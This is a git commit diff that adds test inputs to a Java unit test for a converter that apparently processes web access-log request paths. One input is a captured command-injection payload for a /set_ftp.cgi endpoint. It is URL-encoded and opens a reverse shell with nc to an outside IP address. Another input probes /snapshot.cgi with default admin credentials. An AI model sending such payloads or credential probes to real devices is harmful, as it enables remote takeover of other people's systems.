2eccacfe71e76318d1c688309642730d78f99c0d
Shion Ichikawa <shion1305@gmail.com>
2022-04-07 14:15:08 +0900

    [TEST] add some test cases

--- src/test/java/com/shion1305/route/object/ProcessedAccessDataTest.java
+++ src/test/java/com/shion1305/route/object/ProcessedAccessDataTest.java
@@ -9,6 +9,10 @@ class ProcessedAccessDataTest {
 
     @Test
     public void testConverter() {
-        System.out.println(ProcessedAccessData.convertToTextGroup("192.141.35.15AOINfoaig;nsegnoain124.23.74.25thiesono15.2.61.3"));
+        System.out.println(ProcessedAccessData.convertToTextGroup("/Public/Mobile/ecshe_css/wapmain.css?v=1545408652"));
+        System.out.println(ProcessedAccessData.convertToTextGroup("/snapshot.cgi?user=admin&pwd=12345"));
+        System.out.println(ProcessedAccessData.convertToTextGroup("/set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_\n" +
+                "interval=0&svr=%24%28nc+104.244.75.62+1245+-e+%2Fbin%2Fsh%29"));
+        System.out.println(ProcessedAccessData.convertToTextGroup("/Public/Mobile/ecshe_css/wapmain.css?v=1545408652"));
     }
 }
